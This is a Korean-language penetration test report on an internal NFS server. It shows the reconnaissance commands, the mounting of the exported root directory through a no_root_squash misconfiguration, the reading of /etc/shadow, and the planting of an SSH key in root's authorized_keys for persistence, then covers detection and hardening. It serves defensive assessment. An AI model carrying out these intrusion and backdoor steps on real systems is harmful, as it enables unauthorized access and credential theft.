1. 수행 개요 (Executive Summary)

1.1 목적 및 범위

본 진단은 조직 내 핵심 인프라 서버의 NFS(Network File System, 네트워크 파일 시스템) 서비스에 대한 보안 취약점을 식별하고, 실제 침투 시나리오를 통해 발생 가능한 비즈니스 위험을 평가하는 데 목적이 있습니다. 진단 범위는 내부 망에 위치한 리눅스 기반 파일 공유 서버 1대를 대상으로 수행되었습니다.

  • 진단 대상: 인프라 스토리지 서버 (192.168.10.50)
  • 진단 기간: 2026.03.16 ~ 2026.03.19
  • 수행 인원: 수석 아키텍트 외 1명

1.2 진단 결과 요약

식별된 취약점 수 03 건
최고 위험 등급 Critical
시스템 침투 성공 여부 성공 (루트 권한 획득)

"NFS 서비스의 'no_root_squash' 설정 오류로 인해 외부 공격자가 서버의 모든 파일에 대한 읽기/쓰기 권한을 획득하였으며, SSH 백도어를 통해 지속적인 접근권을 확보함."

2. 상세 진단 과정 (Technical Assessment)

STEP 01

서비스 식별 및 정찰 (Reconnaissance)

타겟 시스템의 가용 서비스를 확인하기 위해 Nmap(Network Mapper, 네트워크 매퍼)를 사용하여 포트 스캐닝을 수행하였습니다. NFS 서비스는 일반적으로 TCP/UDP 2049 포트를 사용하며, 이를 지원하기 위한 RPCBind(Remote Procedure Call Bind, 원격 프로시저 호출 바인드) 서비스가 TCP/UDP 111 포트에서 동작합니다.

Kali Linux Console
# 타겟 IP(192.168.10.50)에 대한 정밀 서비스 스캔 수행
$ sudo nmap -sV -p 111,2049 192.168.10.50
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.10.50
Host is up (0.00015s latency).
PORT STATE SERVICE VERSION
111/tcp open rpcbind 2-4 (RPC bind) # RPC 서비스가 활성화되어 서비스 목록 열거 가능
2049/tcp open nfs 2-4 (Network File System) # NFS 서버 동작 중 확인

[캡처 1: Nmap 스캔 결과 및 서비스 버전 식별 화면]

STEP 02

RPC 서비스 정보 열거 (RPC Enumeration)

rpcinfo(Remote Procedure Call Information, 원격 프로시저 호출 정보 조회) 도구를 사용하여 RPC 매퍼에 등록된 상세 프로그램 리스트를 확인합니다. 이를 통해 NFS 서비스가 어떤 버전(v2, v3, v4)으로 동작하는지, 그리고 mountd(Mount Daemon, 마운트 데몬)가 활성화되어 있는지 분석합니다.

Kali Linux Console
# RPC 프로그램 목록 및 포트 매핑 상태 확인
$ rpcinfo -p 192.168.10.50
program vers proto port service
100000 4 tcp 111 portmapper
100003 2 tcp 2049 nfs # 구버전 NFS v2 지원 (취약 가능성)
100003 3 tcp 2049 nfs # NFS v3 지원 (가장 흔한 공격 대상)
100005 1 udp 42807 mountd # 마운트 요청을 처리하는 데몬 확인

전문가 분석 (Architect Insight)

NFS v3는 호스트 기반의 인증에 의존하며, 패킷이 암호화되지 않는 특성이 있습니다. 111번 포트가 외부에 노출되어 있다는 것은 공격자가 서버의 내부 RPC 구조를 완벽하게 파악할 수 있음을 의미하며, 이는 후속 마운트 공격의 기초 데이터가 됩니다.

STEP 03

공유 자원 노출 분석 (Export Analysis)

showmount(공유 마운트 정보 조회) 명령을 사용하여 타겟 서버에서 외부로 공개(Export)하고 있는 디렉터리 리스트를 조회합니다. 설정 파일인 /etc/exports에서 접근 허용 대상을 와일드카드(*)로 지정했을 경우, 네트워크상의 모든 사용자가 해당 디렉터리를 마운트할 수 있습니다.

Kali Linux Console
# 타겟 서버의 Export(내보내기) 리스트 확인
$ showmount -e 192.168.10.50
Export list for 192.168.10.50:
/ * # 루트(/) 디렉터리가 전체 공개(*) 상태임 - 매우 위험
/home/user/public 192.168.10.0/24 # 특정 서브넷에 공개

[캡처 2: 전체 시스템 루트(/) 경로가 공개된 취약한 Export 리스트 화면]

STEP 04

원격 파일 시스템 마운트 (Remote Mounting)

식별된 취약점을 이용하여 공격자 로컬 디렉터리에 타겟의 루트 파일 시스템을 Mount(마운트, 연결)합니다. 이때 -nolock 옵션은 원격지의 파일 잠금 메커니즘을 무시하여 접근 성공률을 높입니다.

Kali Linux Console
# 1. 마운트용 임시 디렉터리 생성
$ sudo mkdir -p /mnt/target_pwn

# 2. NFS v3 프로토콜을 명시하여 강제 마운트 수행
$ sudo mount -t nfs -o nfsvers=3,nolock 192.168.10.50:/ /mnt/target_pwn

# 3. 연결된 파일 시스템 상태 확인
$ df -h | grep target_pwn
192.168.10.50:/ 20G 8.4G 11G 44% /mnt/target_pwn # 연결 성공

공격자 시점 분석

이제 공격자의 /mnt/target_pwn은 타겟 서버의 물리적 하드 디스크와 직접 연결된 상태입니다. 모든 파일 구조가 공격자의 로컬 폴더처럼 보이게 되며, 네트워크 지연을 제외하고는 로컬 작업과 동일한 성능으로 데이터를 탈취할 수 있습니다.

STEP 05

데이터 유출 및 권한 상승 (Data Exfiltration)

NFS 설정 중 no_root_squash(루트 권한 매핑 금지 해제) 옵션이 활성화된 경우, 공격자 PC의 root 사용자는 타겟 서버에서도 root 권한을 그대로 유지하게 됩니다. 이를 통해 /etc/shadow(비밀번호 해시 파일)와 같은 민감 파일에 접근합니다.

Kali Linux Console
# 타겟 시스템의 민감 설정 파일 열람
$ sudo cat /mnt/target_pwn/etc/shadow | head -n 5
root:$1$LgfW$G/V..:14681:0:99999:7::: # 루트 비밀번호 해시값 노출
daemon:*:14681:0:99999:7:::
bin:*:14681:0:99999:7:::

# 타겟의 /root 디렉터리 직접 접근
$ sudo ls -la /mnt/target_pwn/root
total 44
drwx------ 4 root root 4096 May 20 09:12 . # no_root_squash로 인해 접근 성공
-rw------- 1 root root 421 May 20 09:12 .bash_history # 관리자 작업 이력 확인 가능

[캡처 3: /etc/shadow 파일의 해시값을 성공적으로 읽어오는 공격 화면]

STEP 06

지속성 확보를 위한 백도어 삽입 (Persistence)

공격자는 NFS 연결이 끊기더라도 언제든 재접속할 수 있도록 타겟의 root 계정에 자신의 SSH Public Key(공개키)를 주입합니다. 이를 통해 향후 비밀번호 없이 SSH(Secure Shell, 보안 쉘) 로그인이 가능해집니다.

Kali Linux Console
# 공격자의 공개키를 타겟의 인증 파일에 추가
$ mkdir -p /mnt/target_pwn/root/.ssh
$ cat ~/.ssh/id_rsa.pub >> /mnt/target_pwn/root/.ssh/authorized_keys
$ chmod 600 /mnt/target_pwn/root/.ssh/authorized_keys

# 직접 SSH 접속 시도
$ ssh -i ~/.ssh/id_rsa root@192.168.10.50
root@metasploitable:~# # 패스워드 없이 즉시 시스템 장악 완료

3. 사고 대응 및 로그 분석 (Incident Response)

DETECT 01

실시간 로그 감시 (Live Monitoring)

관리자는 syslog(시스템 로그) 또는 journalctl(저널 관리 도구)을 사용하여 실시간으로 마운트 요청을 모니터링해야 합니다. rpc.mountd의 로그를 통해 비정상적인 IP로부터의 접근 시도를 감지할 수 있습니다.

Target Server Console
# NFS 마운트 관련 로그 실시간 추적
$ tail -f /var/log/syslog | grep mountd
May 20 10:05:22 metasploit rpc.mountd: authenticated mount request from 192.168.10.10:912 for / (rootid 0)
// 보안 관제 포인트: 192.168.10.10(인가되지 않은 IP)에서 루트(/) 마운트가 승인됨

포렌식 관점의 조사 (Forensics)

공격 후에는 /root/.ssh/authorized_keys 파일의 생성 시간을 확인하고, last 명령을 통해 공격자의 로그인 이력을 대조합니다. 또한 netstat -antp 명령어로 활성화된 NFS 세션을 점검하여 현재 연결된 공격자 IP를 식별합니다.

4. 개선 대책 및 보안 강화 (Security Hardening)

/etc/exports 최적화

취약한 설정을 안전한 설정으로 교체하는 가이드입니다.

# 취약한 예 (BAD)
/ * (rw, sync, no_root_squash)

# 안전한 예 (GOOD)
/data 192.168.10.100(rw, sync, root_squash)
  • root_squash: 클라이언트 root를 무권한 사용자(nobody)로 변환 (필수)
  • IP 제한: 와일드카드(*) 대신 특정 IP 주소 명시
  • 디렉터리 최소화: 루트(/) 대신 실제 공유가 필요한 하위 경로만 허용

인프라 계층 방어

NFSv4 도입 및 Kerberos 인증

NFSv4는 단일 포트(2049)를 사용하며, Kerberos(커버로스) 인증을 통해 단순 IP 기반 인증의 한계를 극복합니다.

방화벽(IPtables/UFW) 정책

인가되지 않은 외부 대역에서의 111, 2049 포트 접근을 원천 차단합니다.

5. 진단 결론 (Final Conclusion)

본 모의해킹 결과, 대상 NFS 서버는 관리자 부주의에 의한 설정 오류로 인해 외부 위협에 완전히 무방비 상태였음이 확인되었습니다. 특히 no_root_squash 옵션은 시스템의 근간을 흔드는 보안 결함으로, 발견 즉시 수정이 필요합니다.

인프라 아키텍트는 서비스의 편의성보다 제로 트러스트(Zero Trust, 아무도 신뢰하지 않음) 원칙을 우선하여 설계를 검토해야 하며, 정기적인 취약점 스캐닝과 로그 분석을 통해 변칙적인 마운트 시도를 상시 모니터링할 것을 강력히 권고합니다.
